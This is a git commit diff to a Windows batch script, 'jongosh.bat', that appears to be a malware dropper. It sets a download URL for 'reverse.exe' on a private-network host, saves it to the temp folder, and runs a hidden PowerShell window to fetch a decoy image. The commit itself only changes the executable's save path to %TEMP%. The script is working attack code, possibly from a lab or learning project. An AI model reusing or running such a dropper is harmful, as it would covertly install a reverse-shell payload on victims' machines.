d88d27e522a8bce980149ce6c0717aa184f7e609
5pyD3R <96535745+3rr0r-505@users.noreply.github.com>
2024-03-26 19:50:45 +0530

    Update jongosh.bat

--- jongosh.bat
+++ jongosh.bat
@@ -4,7 +4,7 @@ cd %TEMP%
 
 set "IMAGE_URL=https://raw.githubusercontent.com/3rr0r-505/jongoDB/main/jongo.png" REM Replace with the image hosting site
 set "EXE_URL=http://192.168.77.129/reverse.exe" REM Replace with the file hosting site
-set "EXE_FILE=C:\Users\samra\AppData\Local\Temp\reverse.exe"  REM Replace with the desired absolute path
+set "EXE_FILE=%TEMP%\reverse.exe"  REM Replace with the desired absolute path
 
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%IMAGE_URL%', 'image.jpg')"
 
